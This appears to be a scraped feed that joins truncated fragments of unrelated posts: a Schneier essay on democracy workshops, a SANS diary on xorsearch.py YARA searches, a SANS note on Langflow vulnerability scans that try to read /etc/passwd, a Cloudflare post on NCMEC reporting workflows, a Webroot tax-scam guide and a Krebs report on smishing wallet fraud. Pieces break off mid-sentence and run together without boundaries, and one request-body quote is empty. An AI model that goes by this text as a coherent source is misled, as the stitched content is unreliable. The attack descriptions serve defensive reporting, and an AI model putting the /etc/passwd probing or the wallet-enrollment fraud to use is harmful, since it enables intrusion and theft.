&lt;p&gt;In the workshops, those questions led to others about the limits of democracy. All democracies have boundaries limiting what the majority can decide. We are not allowed to vote &lt;em&gt;Common Knowledge&lt;/em&gt; out of existence, for example, but can generally regulate speech to some degree. We cannot vote, in an election, to jail someone, but we can craft laws that make a particular action illegal. We all have the right to certain things that cannot be taken away from us. In the community of our future, what should be our rights as individuals? What should be the rights of society, superseding those of individuals?&lt;/p&gt;
&lt;p&gt;Personally, I was most interested, at each of the three workshops, in how political systems fail. As a security technologist, I study how complex systems are subverted&amp;#8212;&lt;em&gt;hacked&lt;/em&gt;, in my parlance&amp;#8212;for the benefit of a few at the expense of the many. Think of tax loopholes, or tricks to avoid government regulation. These hacks are common today, and AI tools will make them easier to find&amp;#8212;and even to design&amp;#8212;in the future. I would want any government system to be resistant to trickery. Or, to put it another way: I want the interests of each individual to align with the interests of the group at every level. We have never had a system of government with this property, but&amp;#8212;in a time of existential risks such as climate change&amp;#8212;it is important that we develop one.&lt;/p&gt;
&lt;p&gt;Would this new system of government even be called &amp;#8220;democracy&amp;#8221;? I truly do not know.&lt;/p&gt;
&lt;p&gt;Such speculation is not practical, of course, but still is valuable. Our workshops did not produce final answers and were not intended to do so. Our discourse was filled with suggestions about how to patch our political system where it is fraying. People regularly debate changes to the US Electoral College, or the process of determining voting districts, or the setting of term limits. But those are incremental changes. It is difficult to find people who are thinking more radically: looking beyond the horizon&amp;#8212;not at what is possible today but at what may be possible eventually. Thinking incrementally is critically important, but it is also myopic. It represents a hill-climbing strategy of continuous but quite limited improvements. We also need to think about discontinuous changes that we cannot easily get to from here; otherwise, we may be forever stuck at local maxima. And while true innovation in politics is a lot harder than innovation in technology, especially without a violent revolution forcing changes on us, it is something that we as a species are going to have to get good at, one way or another.&lt;/p&gt;
&lt;p&gt;Our workshop will reconvene for a fourth meeting in December 2025.&lt;/p&gt;
&lt;h3&gt;Note&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;The First International Workshop on Reimagining Democracy (IWORD) was held December 7&amp;#8212;8, 2022. The Second IWORD was held December 12&amp;#8212;13, 2023. Both took place at the Harvard Kennedy School. The sponsors were the Ford Foundation, the Knight Foundation, and the Ash and Belfer Centers of the Kennedy School. See &lt;a href="http://www.schneier.com/blog/archives/2022/12/reimagining-democracy.html"&gt;Schneier, &amp;#8220;Recreating Democracy&amp;#8221;&lt;/a&gt; and &lt;a href="http://www.schneier.com/blog/archives/2024/01/second-interdisciplinary-workshop-on-reimagining-democracy.html"&gt;Schneier, &amp;#8220;Second Interdisciplinary Workshop.&amp;#8221;&lt;/a&gt;&lt;/li&gt;

&lt;p&gt;In stead of &lt;a href="https://blog.didierstevens.com/programs/xorsearch/"&gt;XORsearch.exe&lt;/a&gt;, the original tool that is written in C and compiled, we will use &lt;a href="https://github.com/DidierStevens/DidierStevensSuite/blob/master/xorsearch.py"&gt;xorsearch.py&lt;/a&gt;, a new tool written in Python.&lt;/p&gt;

&lt;p&gt;Unlike XORsearch.exe, xorsearch.py supports YARA rules, and thus regex searches.&lt;/p&gt;

&lt;p&gt;Let's say we want to use this trivial regular expression to match IPv4 addresses (it's matching 4 numbers separated by dots):&amp;nbsp;\d+\.\d+\.\d+\.\d+&lt;/p&gt;

&lt;p&gt;We can create a YARA rule for this regex:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250414-105544.png" style="width: 993px; height: 225px;" /&gt;&lt;/p&gt;

&lt;p&gt;And then we can use this rule on a test file (test-xor-1.bin):&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250414-105832.png" style="width: 993px; height: 155px;" /&gt;&lt;/p&gt;

&lt;p&gt;This tells us that YARA rule ipv4 (namespace ipv4.yara) triggered on file test-xor-1.bin when it is XOR encoded with key 0x19.&lt;/p&gt;

&lt;p&gt;To see the YARA rule strings that were matched, use option --yarastrings:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250414-110204.png" style="width: 993px; height: 199px;" /&gt;&lt;/p&gt;

&lt;p&gt;To see the encoded file, use one of the many dump options, like -a for a HEX/ASCII dump:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250414-110224.png" style="width: 993px; height: 259px;" /&gt;&lt;/p&gt;

&lt;p&gt;Or a binary dump with option -d:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250414-111909.png" style="width: 993px; height: 171px;" /&gt;&lt;/p&gt;

&lt;p&gt;If you find it cumbersome to create a YARA rule just for a simple regex (I find it cumbersome :-) ), you can pass the regex via the command line prefixed with #r#, and xorsearch.py will generate the YARA rule for you:&lt;/p&gt;

&lt;p&gt;&lt;img alt="" src="https://isc.sans.edu/diaryimages/images/20250414-112151.png" style="width: 993px; height: 151px;" /&gt;&lt;/p&gt;

&lt;p&gt;I will give more examples of this in an upcoming diary entry.&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;The Chinese official&amp;#8217;s remarks at the December meeting were indirect and somewhat ambiguous, but most of the American delegation in the room interpreted it as a tacit admission and a warning to the U.S. about Taiwan, a former U.S. official familiar with the meeting said.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Its website states, &amp;quot;Langflow is a low-code tool for developers that makes it easier to build powerful AI agents and workflows that can use any API, model, or database.&amp;quot; It can be installed as a Python package, a standalone desktop application, or as a cloud-hosted service. DataStax provides a ready-built cloud-hosted environment for Langflow.&lt;/p&gt;

&lt;p&gt;The vulnerability went somewhat unnoticed, at least by me, until Horizon3 created a detailed writeup showing how easy it is to exploit the vulnerability and provide proof of concept exploit. Horizon3 published its blog on April 9th [2]. We saw a first hit to the vulnerable URL, &amp;quot;&lt;a href="https://isc.sans.edu/weblogs/urlhistory.html?url=L2FwaS92MS92YWxpZGF0ZS9jb2Rl"&gt;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;/api/v1/validate/code&lt;/span&gt;&lt;/a&gt;&amp;quot;, on April 10th. Today (April 12th), we saw a significant increase in hits for this URL.&lt;/p&gt;

&lt;p&gt;The requests we are seeing are vulnerability scans. They attempt to retrieve the content of &amp;quot;&lt;span style="font-family: Courier New,Courier,monospace;"&gt;/etc/passwd&lt;/span&gt;&amp;quot; to verify if the target system:&lt;/p&gt;

&lt;blockquote&gt;

&amp;nbsp;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Not all of our honeypots report request bodies. So far, this is the only request body we recorded. So far, all of the requests originate from TOR exit nodes.&lt;/p&gt;

This shift replaced our National Center for Missing &amp; Exploited Children (NCMEC) reporting system.</description><content:encoded>&lt;p&gt;Cloudflare plays a significant role in supporting the Internet’s infrastructure. &lt;a href="https://w3techs.com/technologies/history_overview/proxy/all/q"&gt;&lt;u&gt;As a reverse proxy by approximately 20% of all websites&lt;/u&gt;&lt;/a&gt;, we sit directly in the request path between users and the origin, helping to improve performance, security, and reliability at scale. Beyond that, our global network powers services like &lt;a href="https://www.cloudflare.com/en-gb/application-services/products/cdn/"&gt;&lt;u&gt;delivery&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://workers.cloudflare.com/"&gt;&lt;u&gt;Workers&lt;/u&gt;&lt;/a&gt;, and &lt;a href="https://www.cloudflare.com/en-gb/developer-platform/products/r2/"&gt;&lt;u&gt;R2&lt;/u&gt;&lt;/a&gt; — making Cloudflare not just a passive intermediary, but an active platform for delivering and hosting content across the Internet.&lt;/p&gt;&lt;p&gt;Since Cloudflare’s launch in 2010, we have collaborated with the National Center for Missing and Exploited Children (&lt;a href="https://www.missingkids.org/home"&gt;&lt;u&gt;NCMEC&lt;/u&gt;&lt;/a&gt;), a US-based clearinghouse for reporting child sexual abuse material (CSAM), and are committed to doing what we can to support identification and removal of CSAM content.&lt;/p&gt;&lt;p&gt;Members of the public, &lt;a href="https://blog.cloudflare.com/cloudflares-response-to-csam-online/"&gt;&lt;u&gt;customers, and trusted organizations can submit reports&lt;/u&gt;&lt;/a&gt; of abuse observed on Cloudflare’s network. A minority of these reports relate to CSAM, which are triaged with the highest priority by Cloudflare’s Trust &amp;amp; Safety team. We will also forward details of the report, along with relevant files (where applicable) and supplemental information to NCMEC.&lt;/p&gt;&lt;p&gt;The process to generate and submit reports to NCMEC involves multiple steps, dependencies, and error handling, which quickly became complex under our original queue-based architecture. In this blog post, we discuss how Cloudflare &lt;a href="https://developers.cloudflare.com/workflows/"&gt;&lt;u&gt;Workflows&lt;/u&gt;&lt;/a&gt; helped streamline this process and simplify the code behind it.&lt;/p&gt;

          &lt;p&gt;When we designed our latest NCMEC reporting system in early 2024, &lt;a href="https://blog.cloudflare.com/building-workflows-durable-execution-on-workers/"&gt;&lt;u&gt;Cloudflare Workflows&lt;/u&gt;&lt;/a&gt; did not exist yet. We used the Workers platform &lt;a href="https://developers.cloudflare.com/queues/"&gt;&lt;b&gt;&lt;u&gt;Queues&lt;/u&gt;&lt;/b&gt;&lt;/a&gt; as a solution for managing asynchronous tasks, and structured our system around them.&lt;/p&gt;&lt;p&gt;Our goal was to ensure reliability, fault tolerance, and automatic retries. However, without an orchestrator, we had to manually handle state, retries, and inter-queue messaging. While Queues worked, we needed something more explicit to help debug and observe the more complex asynchronous workflows we were building on top of the messaging system that Queues gave us.&lt;/p&gt;&lt;p&gt;In our queue-based architecture each report would go through multiple steps:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Validate input&lt;/b&gt;: Ensure the report has all necessary details.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Initiate report&lt;/b&gt;: Call the NCMEC API to create a report.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Fetch impounded files (if applicable)&lt;/b&gt;: Retrieve files stored in R2.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Upload files&lt;/b&gt;: Send files to NCMEC via API.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Finalize report&lt;/b&gt;: Mark the report as completed.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7n99a6YkThlegGitE2i7iv/a53e70ac11e21025d436c27dce7aaf3a/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;A diagram of our queue-based architecture &lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Each of these steps was handled by a separate queue, and if an error occurred, the system would retry the message several times before marking the report as failed. But errors weren’t always straightforward — for instance, if an external API call consistently failed due to bad input or returned an unexpected response shape, retries wouldn’t help. In those cases, the report could get stuck in an intermediate state, and we’d often have to manually dig through logs across different queues to figure out what went wrong.&lt;/p&gt;&lt;p&gt;Even more frustrating, when handling failed reports, we relied on a "Reaper" — a cron job that ran every hour to resubmit failed reports. Since a report could fail at any step, the Reaper had to deduce which queue failed and send a message to begin reprocessing. This meant:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Debugging was a nightmare&lt;/b&gt;: Tracing the journey of a single report meant jumping between logs for multiple queues.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Retries were unreliable&lt;/b&gt;: Some queues had retry logic, while others relied on the Reaper, leading to inconsistencies.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;State management was painful&lt;/b&gt;: We had no clear way to track whether a report was halfway through the pipeline or completely lost, except by looking through the logs.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Operational overhead was high&lt;/b&gt;: Developers frequently had to manually inspect failed reports and resubmit them.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Queues gave us a solid foundation for moving messages around, but it wasn’t meant to handle orchestration. What we’d really done was build a bunch of loosely connected steps on top of a message bus and hoped it would all hold together. It worked, for the most part, but it was clunky, hard to reason about, and easy to break. Just understanding how a single report moved through the system meant tracing messages across multiple queues and digging through logs.&lt;/p&gt;&lt;p&gt;We knew we needed something better: a way to define workflows explicitly, with clear visibility into where things were and what had failed. But back then, we didn’t have a good way to do that without bringing in heavyweight tools or writing a bunch of glue code ourselves. When Cloudflare Workflows came along, it felt like the missing piece, finally giving us a simple, reliable way to orchestrate everything without duct tape.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;The solution: Cloudflare Workflows&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#the-solution-cloudflare-workflows"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Once &lt;a href="https://developers.cloudflare.com/workflows/"&gt;&lt;u&gt;Cloudflare Workflows&lt;/u&gt;&lt;/a&gt; was &lt;a href="https://blog.cloudflare.com/building-workflows-durable-execution-on-workers/"&gt;&lt;u&gt;announced&lt;/u&gt;&lt;/a&gt;, we saw an immediate opportunity to replace our queue-based architecture with a more structured, observable, and retryable system. Instead of relying on a web of multiple queues passing messages to each other, we now have a single workflow that orchestrates the entire process from start to finish. Critically, if any step failed, the Workflow could pick back up from where it left off, without having to repeat earlier processing steps, re-parsing files, or duplicating uploads.&lt;/p&gt;&lt;p&gt;With Cloudflare Workflows, each report follows a clear sequence of steps:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Creating the report&lt;/b&gt;: The system validates the incoming report and initiates it with NCMEC.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Checking for impounded files&lt;/b&gt;: If there are impounded files associated with the report, the workflow proceeds to file collection.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Gathering files&lt;/b&gt;: The system retrieves impounded files stored in R2 and prepares them for upload.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Uploading files to NCMEC&lt;/b&gt;: Each file is uploaded to NCMEC using their API, ensuring all relevant evidence is submitted.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Adding file metadata&lt;/b&gt;: Metadata about the uploaded files (hashes, timestamps, etc.) is attached to the report.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Finalizing the report&lt;/b&gt;: Once all files are processed, the report is finalized and marked as complete.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Here’s a simplified version of the orchestrator:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;import { WorkflowEntrypoint, WorkflowEvent, WorkflowStep } from 'cloudflare:workers';


export class ReportWorkflow extends WorkflowEntrypoint&amp;lt;Env, ReportType&amp;gt; {
  async run(event: WorkflowEvent&amp;lt;ReportType&amp;gt;, step: WorkflowStep) {
    const reportToCreate: ReportType = event.payload;
    let reportId: number | undefined;


    try {
      await step.do('Create Report', async () =&amp;gt; {
        const createdReport = await createReportStep(reportToCreate, this.env);
        reportId = createdReport?.id;
      });


      if (reportToCreate.hasImpoundedFiles) {
        await step.do('Gather Files', async () =&amp;gt; {
          if (!reportId) throw new Error('Report ID is undefined.');
          await gatherFilesStep(reportId, this.env);
        });


        await step.do('Upload Files', async () =&amp;gt; {
          if (!reportId) throw new Error('Report ID is undefined.');
          await uploadFilesStep(reportId, this.env);
        });


        await step.do('Add File Metadata', async () =&amp;gt; {
          if (!reportId) throw new Error('Report ID is undefined.');
          await addFilesInfoStep(reportId, this.env);
        });
      }


      await step.do('Finalize Report', async () =&amp;gt; {
        if (!reportId) throw new Error('Report ID is undefined.');
        await finalizeReportStep(reportId, this.env);
      });
    } catch (error) {
      console.error(error);
      throw error;
    }
  }
}&lt;/code&gt;&lt;/pre&gt;
            &lt;p&gt;Not only can tasks be broken into discrete steps, but the Workflows dashboard gives us real-time visibility into each report processed and the status of each step in the workflow!&lt;/p&gt;&lt;p&gt;This allows us to easily see active and completed workflows, identify which steps failed and where, and retry failed steps or terminate workflows. These features revolutionize how we troubleshoot issues, providing us with a tool to deep dive into any issues that arise and retry steps with a click of a button.&lt;/p&gt;&lt;p&gt;Below are two dashboard screenshots, one of our running workflows and the second of an inspection of the success and failures of each step in the workflow. Some workflows look slower or “stuck” — that’s because failed steps are retried with exponential backoff. This helps smooth over transient issues like flaky APIs without manual intervention.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2DjVg3WMp8e5QGy19TuHMj/69e611c9267598c44e5a2b120f0f59ac/image4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cloudflare Workflows Dashboard for our NCMEC Workflow&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5ElqnGMtnJQumNhuWZI3nb/6866cc9aa2b27856a8730a9faebc1747/image3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cloudflare Workflows Dashboard containing a breakout of the NCMEC Workflow Steps&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Cloudflare Workflows transformed how we handle NCMEC incident reports. What was once a complex, queue-based architecture is now a structured, retryable, and observable process. Debugging is easier, error handling is more robust, and monitoring is seamless. &lt;/p&gt;
          &lt;div&gt;

          &lt;/div&gt;
        &lt;p&gt;If you’re also building larger, multi-step applications, or have an existing Workers application that has started to approach what we ended up with for our incident reporting process, then you can typically wrap that code within a Workflow with minimal changes. &lt;a href="https://developers.cloudflare.com/workflows/examples/backup-d1/"&gt;&lt;u&gt;Workflows can read from R2, write to KV, query D1&lt;/u&gt;&lt;/a&gt; and call other APIs just like any other Worker, but are designed to help orchestrate asynchronous, long-running tasks.&lt;/p&gt;&lt;p&gt;To get started with Workflows, you can head to the &lt;a href="https://developers.cloudflare.com/workflows/"&gt;&lt;u&gt;Workflows developer documentation&lt;/u&gt;&lt;/a&gt; and/or pull down the starter project and dive into the code immediately:&lt;/p&gt;
            &lt;pre&gt;&lt;code&gt;$ npm create cloudflare@latest workflows-starter -- 
--template="cloudflare/workflows-starter"

&lt;p&gt;The post &lt;a href="https://www.webroot.com/blog/2025/04/11/protect-yourself-from-tax-season-scams/" rel="nofollow"&gt;Protect yourself from tax season scams&lt;/a&gt; appeared first on &lt;a href="https://www.webroot.com/blog" rel="nofollow"&gt;Webroot Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;For most of us, tax season is all about finding documents, filling out forms, and crossing your fingers you’re getting a refund. But while you’re busy trying to get your returns filed on time, tax scammers and identity thieves are busy trying to steal your precious personal information.&lt;/p&gt;



&lt;p&gt;During tax season, a vast amount of valuable personal and financial data is shared online, making it prime time for cybercriminals to rob you of your confidential information, identity, and money. According to the IRS, almost 300,000 cases of identity theft were reported in 2024, leading to &lt;a href="https://www.cnbc.com/select/tax-scams-how-to-avoid-them/#:~:text=Every%20tax%20season%2C%20scammers%20ramp,%245.5%20billion%20in%20tax%20fraud." rel="noreferrer noopener" target="_blank"&gt;$5.5 billion in tax fraud&lt;/a&gt;. That’s why each year, the IRS releases its list of &lt;a href="https://www.irs.gov/newsroom/dirty-dozen-tax-scams-for-2025-irs-warns-taxpayers-to-watch-out-for-dangerous-threats" rel="noreferrer noopener" target="_blank"&gt;Dirty Dozen Tax Scams&lt;/a&gt;. Here are some of the top schemes you need to watch out for this tax season.&lt;/p&gt;



&lt;h2&gt;Common tax scams to watch out for in 2025&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;IRS Impersonation: &lt;/strong&gt;The most common type of &lt;a href="https://www.idwatchdog.com/education/-/article/irs-phishing-and-impersonation-scams" rel="noreferrer noopener" target="_blank"&gt;tax fraud&lt;/a&gt; starts with a phone call, text or email. The fraudster claims to be from the IRS and says you owe back taxes. They demand immediate payment, using threats of arrest, business or driver’s license suspension, or deportation. These scams often target vulnerable people, such as the elderly or immigrants, and take advantage of the fear and uncertainty many people have about tax returns. It’s easy to avoid these scams by remembering this important tip &amp;#8211; &lt;strong&gt;the first time the IRS contacts you, it will be by &lt;a href="https://www.irs.gov/help/how-to-know-its-the-irs" rel="noreferrer noopener" target="_blank"&gt;U.S. mail only&lt;/a&gt;, never by phone, text or email!&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Phishing emails and text messages: &lt;/strong&gt;Phishing schemes can happen through emails, texts or social media. Scammers send messages to try to trick you into sharing sensitive information like W-2 forms, usernames, passwords, and account details. They sometimes offer big refunds or threaten to charge penalties. Never click links or open attachments in unsolicited messages, as they may contain malicious software. You can learn how to &lt;a href="https://www.irs.gov/privacy-disclosure/report-phishing" rel="noreferrer noopener" target="_blank"&gt;report suspected phishing&lt;/a&gt; here.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Tax Preparers Impersonators: &lt;/strong&gt;&lt;a href="https://www.irs.gov/newsroom/irs-dont-be-victim-to-a-ghost-tax-return-preparer" rel="noreferrer noopener" target="_blank"&gt;Ghost tax return preparers&lt;/a&gt; pretend to be tax professionals, but they’re not actually certified. They may promise large or fast refunds to get your business. Impersonators often fill out your tax return, but then refuse to sign it or include their &lt;a href="https://www.webroot.com/www.irs.gov/tax-professionals/ptin-requirements-for-tax-return-preparers" rel="noreferrer noopener" target="_blank"&gt;IRS Preparer Tax Identification Number (PTIN),&lt;/a&gt; which is required by law. Sometimes they simply file a fraudulent return and take your money, leaving you liable for any false information and penalties.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Identity theft refund fraud: &lt;/strong&gt;Scammers use your stolen data to file a fraudulent electronic tax return in your name. They collect a refund, and you may not even know you’ve been targeted until your own return is rejected. The best way to avoid tax refund fraud is to file your return early. If a criminal files first, reclaiming&amp;nbsp; your refund can be a long and difficult process.&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;Warning signs of tax scams&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Unexpected communications claiming to be from IRS:&lt;/strong&gt; The IRS will never ask for sensitive information or payment via email, phone, text or social media.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Demands for immediate payment: &lt;/strong&gt;The IRS will never demand immediate payment &amp;#8211; you will always be given the opportunity to appeal a tax debt.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Threats of legal action or arrest: &lt;/strong&gt;The IRS will not threaten you with police action or deportation.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Requests for unusual payment methods: &lt;/strong&gt;The IRS doesn’t demand specific types of payment, including in-person payments, prepaid debit cards or gift cards.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Promises of unusually large refunds: &lt;/strong&gt;If someone promises you a bigger-than-normal refund, be wary. You could be scammed into filing a fraudulent return and end up on the hook for any false claims.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;How to protect yourself&lt;/h2&gt;



&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Verify tax preparer credentials: &lt;/strong&gt;Always use a &lt;a href="https://www.irs.gov/tax-professionals/choosing-a-tax-professional" rel="noreferrer noopener" target="_blank"&gt;trusted tax preparer&lt;/a&gt; to prepare your return.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Use secure filing methods: &lt;/strong&gt;Here are tips to &lt;a href="https://www.usa.gov/file-taxes" rel="noreferrer noopener" target="_blank"&gt;file your tax return&lt;/a&gt; safely.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Protect personal information: &lt;/strong&gt;Treat your personal information as confidential files. Don’t carry your Social Security card with you and guard your tax records and other private data.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Report suspicious activity: &lt;/strong&gt;Report any &lt;a href="https://www.irs.gov/help/tax-scams/report-a-tax-scam-or-fraud" rel="noreferrer noopener" target="_blank"&gt;suspected tax fraud&lt;/a&gt; here.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Know how the IRS communicates: &lt;/strong&gt;Physical mail is the preferred form of messaging for the IRS. Always confirm the validity of any &lt;a href="https://www.irs.gov/help/how-to-know-its-the-irs#:~:text=Text%20message%20%2D%20We%20text%20you,person%20visit%20%2D%20These%20are%20rare." rel="noreferrer noopener" target="_blank"&gt;IRS communications.&lt;/a&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Get antivirus protection for all your personal data: &lt;/strong&gt;&lt;a href="https://www.webroot.com/us/en/home/products/total-protection"&gt;Webroot&lt;/a&gt; solutions safeguard against tax-related phishing scams, as well as viruses and malware designed to steal your private information.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Use identity protection:&lt;/strong&gt;&lt;strong&gt;&lt;a&gt; &lt;/a&gt;&lt;/strong&gt;For tax season and every other season, &lt;a href="https://www.webroot.com/us/en/home/products/premium?srsltid=AfmBOoomAjFcuekQGFn9Ce1GZFlfef3PmgzJMBFxS6x-UoRcYuXm8BCl"&gt;Webroot Premium&lt;/a&gt; and &lt;a href="https://www.webroot.com/us/en/home/products/total-protection"&gt;Webroot Total Protection&lt;/a&gt; offer all-in-one device and identity protection to keep your valuable data safe from scammers. A single subscription can safeguard your entire digital life with dark web monitoring, rapid alerts regarding fraudulent activity, 24/7 customer support, and $1 million reimbursement for stolen funds and other expenses related to identity theft.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Back up your tax records:&lt;/strong&gt;&amp;nbsp;Make digital and physical backups of your tax documents. Store electronic copies in an encrypted cloud storage service &amp;nbsp;and keep printed copies in a secure location. &lt;a href="https://www.carbonite.com/" rel="noreferrer noopener" target="_blank"&gt;Carbonite&lt;/a&gt; is the perfect solution. It encrypts your tax documents and all your other data in the cloud and offers continuous backups and unlimited storage.&lt;a id="_msocom_1"&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;See you at RSAC 2025!&lt;/p&gt;

Until recently, the so-called &amp;#8220;&lt;strong&gt;Smishing Triad&lt;/strong&gt;&amp;#8221; mainly impersonated toll road operators and shipping companies. But experts say these groups are now directly targeting customers of international financial institutions, while dramatically expanding their cybercrime infrastructure and support staff.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70947" style="width: 760px;"&gt;&lt;img alt="" class=" wp-image-70947" height="762" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/wall-o-phones.png" width="750" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70947"&gt;An image of an iPhone device farm shared on Telegram by one of the Smishing Triad members. Image: Prodaft.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;If you own a mobile device, the chances are excellent that at some point in the past two years you&amp;#8217;ve received at least one instant message that warns of a delinquent toll road fee, or a wayward package from the &lt;strong&gt;U.S. Postal Service &lt;/strong&gt;(USPS). Those who click the promoted link are brought to a website that spoofs the USPS or a local toll road operator and asks for payment card information.&lt;/p&gt;
&lt;p&gt;The site will then complain that the visitor&amp;#8217;s bank needs to &amp;#8220;verify&amp;#8221; the transaction by sending a one-time code via SMS. In reality, the bank is sending that code to the mobile number on file for their customer because the fraudsters have just attempted to enroll that victim&amp;#8217;s card details into a mobile wallet.&lt;/p&gt;
&lt;p&gt;If the visitor supplies that one-time code, their payment card is then added to a new mobile wallet on an Apple or Google device that is physically controlled by the phishers. The phishing gangs typically load &lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/02/phishingphones.png" rel="noopener" target="_blank"&gt;multiple stolen cards to digital wallets on a single Apple or Android device&lt;/a&gt;, and then sell those phones in bulk to scammers who use them for fraudulent e-commerce and tap-to-pay transactions.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70953" style="width: 759px;"&gt;&lt;a href="https://krebsonsecurity.com/wp-content/uploads/2025/04/mobwalletimage.png" rel="noopener" target="_blank"&gt;&lt;img alt="" class="wp-image-70953" height="396" src="https://krebsonsecurity.com/wp-content/uploads/2025/04/mobwalletimage.png" width="749" /&gt;&lt;/a&gt;&lt;p class="wp-caption-text" id="caption-attachment-70953"&gt;A screenshot of the administrative panel for a smishing kit. On the left is the (test) data entered at the phishing site. On the right we can see the phishing kit has superimposed the supplied card number onto an image of a payment card. When the phishing kit scans that created card image into Apple or Google Pay, it triggers the victim&amp;#8217;s bank to send a one-time code. Image: Ford Merrill.&lt;/p&gt;&lt;/div&gt;
&lt;p&gt;The moniker &amp;#8220;Smishing Triad&amp;#8221; comes from &lt;strong&gt;Resecurity&lt;/strong&gt;, which was among &lt;a href="https://www.resecurity.com/blog/article/smishing-triad-targeted-usps-and-us-citizens-for-data-theft" rel="noopener" target="_blank"&gt;the first to report in August 2023&lt;/a&gt; on the emergence of three distinct mobile phishing groups based in China that appeared to share some infrastructure and innovative phishing techniques. But it is a bit of a misnomer because the phishing lures blasted out by these groups are not SMS or text messages in the conventional sense.&lt;/p&gt;
&lt;p&gt;Rather, they are sent via &lt;strong&gt;iMessage&lt;/strong&gt; to &lt;strong&gt;Apple&lt;/strong&gt; device users, and via RCS on &lt;strong&gt;Google Android&lt;/strong&gt; devices. Thus, the missives bypass the mobile phone networks entirely and enjoy near 100 percent delivery rate (at least until Apple and Google suspend the spammy accounts).&lt;/p&gt;
